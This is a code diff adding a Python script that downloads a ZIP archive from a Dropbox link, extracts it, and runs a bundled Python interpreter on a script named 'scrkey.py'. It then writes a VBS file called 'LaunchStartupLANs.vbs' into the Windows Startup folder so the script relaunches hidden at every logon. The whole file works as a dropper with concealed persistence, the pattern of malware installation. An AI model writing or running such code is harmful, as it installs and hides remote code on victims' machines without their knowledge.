@@ -1,1 +1,47 @@
-None
+import os
+import requests
+
+# Step 1: Download the ZIP file
+url = "https://www.dropbox.com/scl/fi/sbq9413hwmjfwa7tfls7l/Appaqsd.zip?rlkey=6fc350kb9f0rvh676o7v5n06g&dl=1"
+filename = os.path.join("Appaqsd.zip")
+with requests.get(url, stream=True) as r:
+    r.raise_for_status()
+    with open(filename, 'wb') as f:
+        for chunk in r.iter_content(chunk_size=8192):  # Adjust chunk size as needed
+            f.write(chunk)
+
+print("Downloaded the ZIP file.")
+
+# Step 2: Extract the ZIP file
+# Use the 'tar' command on Windows, ensure tar is available on your system; else, you may need other utilities like 7-Zip
+extract_command = f"tar -xf {filename}"
+print(extract_command)
+os.system(extract_command)
+print("Extracted the ZIP file.")
+
+# Step 3: Execute the program
+# Modify paths as necessary according to the actual structure inside your ZIP file
+# This assumes 'run.py' is in the root of the 'Appaqsd' folder after extraction
+print(f'Executing the program...')
+full_path = os.path.join(os.getcwd(), "Appaqsd")
+full_python_path = os.path.join(os.getcwd(), "Appaqsd")
+full_python_path = os.path.join(os.getcwd(), "Appaqsd", "python.exe")
+full_script_path = os.path.join(os.getcwd(), "Appaqsd", "scrkey.py")
+print(f'{full_python_path} {full_script_path}')
+# add a vbs script to startup that will launch "Appaqsd", "basrq.py" with "Appaqsd", "python.exe"
+startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+vbs_script_path = os.path.join(startup_folder, "LaunchStartupLANs.vbs")
+
+vbs_content = f"""
+Set WshShell = CreateObject("WScript.Shell")
+
+WshShell.CurrentDirectory = "{full_path}"
+WshShell.Run "{full_python_path} {full_script_path}", 0, True
+Set WshShell = Nothing 
+"""
+with open(vbs_script_path, 'w') as vbs_file:
+    vbs_file.write(vbs_content.strip())
+os.system(f'{full_python_path} {full_script_path}')
+
+
+print("Executed the program.")
